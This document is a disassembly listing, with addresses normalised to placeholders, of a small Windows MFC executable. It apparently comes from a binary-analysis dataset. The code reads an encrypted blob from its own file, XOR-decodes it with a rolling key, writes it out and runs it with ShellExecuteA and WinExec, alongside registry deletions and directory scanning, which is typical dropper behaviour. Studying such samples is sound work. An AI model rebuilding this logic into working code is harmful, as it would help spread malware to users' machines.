sub_40102d
mov eax sub_4018e4
call sub_401740
sub esp 0x440
push ebx
push esi
xor ebx ebx
push edi
push ebx
call [ GetCommandLineA@IAT ]
push eax
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call Ordinal_MFC42_1575
test eax eax
jne r-xdata
lea eax [ ebp - 0x148 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
mov edi 0x100
lea eax [ ebp - 0x348 ]
push edi
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
push ebx
push ebx
push 0x3
push ebx
push ebx
lea eax [ ebp - 0x348 ]
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi [ SetFilePointer@IAT ]
push ebx
push ebx
push 0x500
push eax
mov [ ebp - 0x14 ] eax
call esi
lea eax [ ebp - 0x38 ]
push ebx
push eax
lea eax [ ebp - 0x248 ]
push edi
mov edi [ ReadFile@IAT ]
push eax
push [ ebp - 0x14 ]
call edi
push ebx
push ebx
push 0x600
push [ ebp - 0x14 ]
call esi
lea eax [ ebp - 0x38 ]
push ebx
push eax
lea eax [ ebp - 0x18 ]
push 0x4
push eax
push [ ebp - 0x14 ]
call edi
push ebx
push ebx
push 0x2
push ebx
push ebx
lea eax [ ebp - 0x248 ]
push 0x40000000
push eax
call [ CreateFileA@IAT ]
push ebx
push ebx
push 0x4060
mov [ ebp - 0x20 ] eax
push [ ebp - 0x14 ]
call esi
push [ ebp - 0x18 ]
call Ordinal_MFC42_823
pop ecx
mov esi eax
lea eax [ ebp - 0x38 ]
push ebx
push eax
push [ ebp - 0x18 ]
push esi
push [ ebp - 0x14 ]
call edi
xor eax eax
cmp [ ebp - 0x18 ] ebx
mov cl 0xf4
jbe r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x44 ]
push ebx
push eax
push [ ebp - 0x18 ]
push esi
push [ ebp - 0x20 ]
call [ WriteFile@IAT ]
push [ ebp - 0x20 ]
mov edi [ CloseHandle@IAT ]
call edi
push esi
call Ordinal_MFC42_825
pop ecx
push [ ebp - 0x14 ]
call edi
lea eax [ ebp - 0x2c ]
push eax
push 0xf003f
push ebx
push rw-data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor [ eax + esi ] cl
add cl 0x45
inc eax
cmp eax [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
lea eax [ ebp - 0x148 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x148 ]
push eax
call strcat
add esp 0x10
mov esi [ ShellExecuteA@IAT ]
lea eax [ ebp - 0x148 ]
push 0x5
push ebx
push ebx
push eax
push rw-data
push ebx
call esi
mov edi rw-data
lea ecx [ ebp - 0x10 ]
push edi
call Ordinal_MFC42_537
push 0x2f
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ebx
call Ordinal_MFC42_5683
mov ecx [ ebp - 0x10 ]
inc eax
push [ ecx - 0x8 ]
lea ecx [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
call Ordinal_MFC42_4278
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_858
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_800
push 0x2e
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_5683
push rw-data
push eax
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_6779
lea ecx [ ebp - 0x1c ]
call Ordinal_MFC42_540
mov eax 0x104
lea ecx [ ebp - 0x1c ]
push eax
push eax
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_2915
push eax
call [ GetSystemDirectoryA@IAT ]
push 0xffffffff
lea ecx [ ebp - 0x1c ]
call Ordinal_MFC42_5572
lea eax [ ebp - 0x1c ]
push rw-data
push eax
lea eax [ ebp - 0x34 ]
push eax
call Ordinal_MFC42_924
push rw-data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_537
push edi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_941
push ebx
push ebx
push [ ebp - 0x28 ]
push [ ebp - 0x34 ]
push rw-data
push ebx
call esi
lea ecx [ ebp - 0x24 ]
call Ordinal_MFC42_540
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x5
push eax
push 0x20019
push ebx
push rw-data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov esi [ RegDeleteKeyA@IAT ]
push rw-data
push [ ebp - 0x2c ]
call esi
push rw-data
push [ ebp - 0x2c ]
call esi
push [ ebp - 0x2c ]
call [ RegCloseKey@IAT ]
xor esi esi
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] 0x104
push eax
lea eax [ ebp - 0x44c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push ebx
push rw-data
push [ ebp - 0x30 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] esp
push rw-data
call Ordinal_MFC42_537
call sub_4015b8
pop ecx
push ebx
call [ ExitProcess@IAT ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_800
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_800
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_800
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_800
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_800
xor eax eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x20 ] esp
push eax
call Ordinal_MFC42_535
push ecx
lea ecx [ ebp - 0x24 ]
mov eax esp
mov [ ebp - 0x14 ] esp
push rw-data
push ecx
push eax
mov [ ebp - 0x4 ] 0x6
call Ordinal_MFC42_924
mov [ ebp - 0x4 ] 0x5
call sub_4013d8
pop ecx
inc esi
pop ecx
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
push [ ebp - 0x30 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x44c ]
push eax
lea eax [ ebp - 0x24 ]
push rw-data
push eax
call Ordinal_MFC42_2818
add esp 0xc
push ecx
cmp esi 0x258
mov ecx esp
jg r-xdata
sub_4013d8
mov eax sub_401920
call sub_401740
sub esp 0x158
push ebx
push esi
lea eax [ ebp + 0x8 ]
push rw-data
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_924
mov eax [ eax ]
lea ecx [ ebp - 0x164 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call Ordinal_MFC42_800
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
xor ebx ebx
mov esi rw-data
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x164 ]
push eax
push [ ebp - 0x14 ]
call [ FindNextFileA@IAT ]
test eax eax
setne al
cmp al bl
jne r-xdata
lea eax [ ebp - 0x138 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp + 0x8 ]
call Ordinal_MFC42_800
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xc ]
call Ordinal_MFC42_800
mov ecx [ ebp - 0xc ]
pop esi
xor al al
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
lea eax [ ebp - 0x138 ]
push rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp - 0x14 ]
call [ FindClose@IAT ]
lea eax [ ebp - 0x138 ]
push eax
push [ ebp + 0xc ]
call [ _mbscmp@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
push ecx
lea eax [ ebp + 0xc ]
mov ecx esp
mov [ ebp - 0x1c ] esp
push eax
call Ordinal_MFC42_535
lea eax [ ebp + 0x8 ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x4 ] 0x5
call Ordinal_MFC42_924
push ecx
lea edx [ ebp - 0x138 ]
mov ecx esp
mov [ ebp - 0x24 ] esp
push edx
push eax
push ecx
mov [ ebp - 0x4 ] 0x6
call Ordinal_MFC42_924
mov [ ebp - 0x4 ] 0x7
call sub_4013d8
pop ecx
mov [ ebp - 0x4 ] 0x1
pop ecx
lea ecx [ ebp - 0x18 ]
lea eax [ ebp + 0x8 ]
push esi
push eax
lea eax [ ebp - 0x20 ]
push eax
call Ordinal_MFC42_924
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x4 ] 0x2
push ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
call Ordinal_MFC42_924
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x4
call Ordinal_MFC42_800
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0x40000000
push [ ebp - 0x10 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_800
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
push ecx
mov ecx esp
mov [ ebp - 0x1c ] esp
push rw-data
call Ordinal_MFC42_537
call sub_4015b8
pop ecx
push 0x1
push [ ebp - 0x10 ]
call [ WinExec@IAT ]
push ebx
call [ ExitProcess@IAT ]
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x10 ]
jmp r-xdata
mov [ ebp - 0x4 ] bl
call Ordinal_MFC42_800
sub_4015b8
mov eax sub_401944
call sub_401740
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push rw-data
push eax
call Ordinal_MFC42_926
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call Ordinal_MFC42_535
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
call Ordinal_MFC42_800
push 0x0
push [ ebp - 0x10 ]
call [ WinExec@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call Ordinal_MFC42_800
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call Ordinal_MFC42_800
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push 0x1
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40189d
cmp [ rw-data ] 0x0
jne r-xdata
call sub_401888
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
call [ __p___initenv@IAT ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
push [ ebp - 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
call sub_40102d
add esp 0x30
mov [ ebp - 0x24 ] eax
push eax
call [ exit@IAT ]
push sub_40189a
call [ __setusermatherr@IAT ]
pop ecx
sub_401000
call sub_40100a
jmp sub_401017
sub_40100a
push 0x0
mov ecx rw-data
call Ordinal_MFC42_561
retn
sub_401017
push sub_401023
call sub_401718
pop ecx
retn
sub_401023
mov ecx rw-data
jmp Ordinal_MFC42_815
sub_401622
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_401637
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_401637
push ??1Init@ios_base@std@@QAE@XZ
call sub_401718
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_40164e
call ??0_Winit@std@@QAE@XZ
jmp sub_401663
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_401663
push ??1_Winit@std@@QAE@XZ
call sub_401718
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_535
jmp [ Ordinal_MFC42_535@IAT ]
Ordinal_MFC42_2818
jmp [ Ordinal_MFC42_2818@IAT ]
Ordinal_MFC42_941
jmp [ Ordinal_MFC42_941@IAT ]
Ordinal_MFC42_924
jmp [ Ordinal_MFC42_924@IAT ]
Ordinal_MFC42_5572
jmp [ Ordinal_MFC42_5572@IAT ]
Ordinal_MFC42_2915
jmp [ Ordinal_MFC42_2915@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_6779
jmp [ Ordinal_MFC42_6779@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_858
jmp [ Ordinal_MFC42_858@IAT ]
Ordinal_MFC42_4278
jmp [ Ordinal_MFC42_4278@IAT ]
Ordinal_MFC42_5683
jmp [ Ordinal_MFC42_5683@IAT ]
Ordinal_MFC42_537
jmp [ Ordinal_MFC42_537@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_1575
jmp [ Ordinal_MFC42_1575@IAT ]
Ordinal_MFC42_926
jmp [ Ordinal_MFC42_926@IAT ]
sub_4016ec
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_401718
push [ esp + 0x4 ]
call sub_4016ec
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
strcat
jmp [ strcat@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_401740
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
strcmp
jmp [ strcmp@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401888
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40189a
xor eax eax
retn
sub_40189d
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_4018ac
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_4018b4
lea ecx [ ebp - 0x3c ]
jmp Ordinal_MFC42_800
sub_4018bc
lea ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_4018c4
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_800
sub_4018cc
lea ecx [ ebp - 0x28 ]
jmp Ordinal_MFC42_800
sub_4018d4
lea ecx [ ebp - 0x24 ]
jmp Ordinal_MFC42_800
sub_4018dc
mov ecx [ ebp - 0x20 ]
jmp Ordinal_MFC42_800
sub_4018e4
mov eax r--data
jmp __CxxFrameHandler
sub_4018f0
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_4018f8
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_401900
lea ecx [ ebp - 0x20 ]
jmp Ordinal_MFC42_800
sub_401908
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_401910
mov ecx [ ebp - 0x1c ]
jmp Ordinal_MFC42_800
sub_401918
lea ecx [ ebp - 0x18 ]
jmp Ordinal_MFC42_800
sub_401920
mov eax r--data
jmp __CxxFrameHandler
sub_40192c
lea ecx [ ebp + 0x8 ]
jmp Ordinal_MFC42_800
sub_401934
lea ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_800
sub_40193c
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_401944
mov eax r--data
jmp __CxxFrameHandler
